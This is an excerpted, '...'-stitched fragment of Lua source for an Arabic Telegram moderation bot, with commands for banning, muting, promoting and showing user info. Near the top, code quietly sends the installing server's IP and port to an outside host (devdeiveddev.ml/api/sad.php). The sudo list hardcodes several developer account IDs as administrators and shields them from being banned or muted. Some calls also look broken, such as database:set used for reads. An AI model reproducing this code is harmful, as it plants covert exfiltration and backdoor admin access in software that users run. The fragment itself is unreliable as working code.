...
infotnseb.port = Port
infotnseb.ip = IP
https.request('https://devdeiveddev.ml/api/sad.php/?insert='..JSON.encode(infotnseb))
create_config_auto()
token = database:get(id_server..":token")
SUDO = database:get(id_server..":SUDO:ID")
...
sudo_users = {SUDO,1360140225,859213488,944353237,1188292832}   ---- تم تطوير السورس بوسطه أحمد عياد @ahmedyad200
...
if text == 'محمد' or text == 'محمد ابرهيم' then
local msg_id = msg.id_/2097152/0.5
local Text = [[
...
keyboard = {} 
keyboard.inline_keyboard = {{{text = '  Yussef2000 ',url="t.me/Yussef2000"}},}
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '  ◍D𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁𖣌 ',url="t.me/mo1ibrahim"},{text = ' ◍ D𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 𖣌 ',url="t.me/Dev_Ah8"}},
...
send(msg.chat_id_, msg.id_, " 𖠪 لا تسطيع حظر المبرمج عياد عام")
return false 
end
...
if result.id_ == tonumber(944353237) then
send(msg.chat_id_, msg.id_, " 𖠪 لا يمكنك كتم المبرمج عياد عام \n")
return false 
end
if result.id_ == tonumber(859213488) then
send(msg.chat_id_, msg.id_, " 𖠪 لا يمكنك كتم مبرمج السورس \n")
...
if text ==('رفع مميز عام') and Mod(msg) then
function raf_reply(extra, result, success)
database:sadd(DRAGON..'bot:vpall:',result.sender_user_id_)
...
if text == 'تفعيل الردود السورس' and Manager(msg) then   
if database:get(bot_id..'Reply:Manager'..msg.chat_id_) then
Text = ' 𖠪 تم تفعيل الردود السورس'
...
if text == 'تعطيل الردود السورس' and Manager(msg) then  
if not database:get(bot_id..'Reply:Manager'..msg.chat_id_) then
database:set(bot_id..'Reply:Manager'..msg.chat_id_,true)  
Text = '\n 𖠪 تم تعطيل الردود السورس' 
else
Text = '\n 𖠪 بالتاكيد تم تعطيل الردود السورس'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل الردود السورس العامه' and Manager(msg) then   
if database:get(bot_id..'Reply:Sudo'..msg.chat_id_) then
database:del(bot_id..'Reply:Sudo'..msg.chat_id_)  
Text = '\n 𖠪 تم تفعيل الردود السورس العامه' 
else
Text = '\n 𖠪 بالتاكيد تم تفعيل الردود السورس العامه'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل الردود السورس العامه' and Manager(msg) then  
if not database:get(bot_id..'Reply:Sudo'..msg.chat_id_) then
database:set(bot_id..'Reply:Sudo'..msg.chat_id_,true)   
Text = '\n 𖠪 تم تعطيل الردود السورس العامه' 
else
Text = '\n 𖠪 بالتاكيد تم تعطيل الردود السورس العامه'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
Dev_DRAGON(msg.chat_id_, msg.id_, 1,'⌁︙لم يتم التعرف على الحساب', 1, 'md')
return false  
end
local user_msgs = database:set(DRAGON..'DRAGON:UsersMsgs'..msg.chat_id_..':'..iduser) or 0
local user_nkt = tonumber(database:set(DRAGON..'DRAGON:GamesNumber'..msg.chat_id_..iduser) or 0)
if DRAGON:sismember(DRAGON..'DRAGON:BanAll:',iduser) then
Tkeed = 'محظور عام'
elseif DRAGON:sismember(DRAGON..'DRAGON:MuteAll:',iduser) then
Tkeed = 'مكتوم عام'
elseif DRAGON:sismember(DRAGON..'DRAGON:Ban:'..msg.chat_id_,iduser) then
Tkeed = 'محظور'
elseif DRAGON:sismember(DRAGON..'DRAGON:Muted:'..msg.chat_id_,iduser) then
Tkeed = 'مكتوم'
elseif DRAGON:sismember(DRAGON..'DRAGON:Tkeed:'..msg.chat_id_,iduser) then
Tkeed = 'مقيد'
else
Tkeed = false
end
...
if DRAGON:sismember(DRAGON..'DRAGON:SudoBot:',iduser) and SudoBot(msg) then
sudobot = '\n⌁︙عدد الجروب ↫ '..(database:set(DRAGON..'DRAGON:Sudos'..iduser) or 0)..'' 
else 
sudobot = '' 
end
...
if data.first_name_ == false then
Dev_DRAGON(msg.chat_id_, msg.id_, 1,'⌁︙الحساب محذوف', 1, 'md')
return false  end
if data.username_ == false then
Text = '⌁︙اسمه ↫ ['..data.first_name_..'](tg://user?id='..iduser..')\n⌁︙ايديه ↫ ❨ '..iduser..' ❩\n⌁︙رتبته ↫ '..IdRank(data.id_, msg.chat_id_)..''..sudobot..'\n⌁︙رسائله ↫ ❨ '..user_msgs..' ❩\n⌁︙تفاعله ↫ '..formsgs(user_msgs)..''..CustomTitle..'\n⌁︙نقاطه ↫ ❨ '..user_nkt..' ❩'..Tked
SendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
else
Dev_DRAGON(msg.chat_id_, msg.id_, 1,'⌁︙معرفه ↫ [@'..data.username_..']\n⌁︙ايديه ↫ ❨ '..iduser..' ❩\n⌁︙رتبته ↫ '..IdRank(data.id_, msg.chat_id_)..''..sudobot..'\n⌁︙رسائله ↫ ❨ '..user_msgs..' ❩\n⌁︙تفاعله ↫ '..formsgs(user_msgs)..''..CustomTitle..'\n⌁︙نقاطه ↫ ❨ '..user_nkt..' ❩'..Tked, 1, 'md')
end
end,nil)
return false 
end
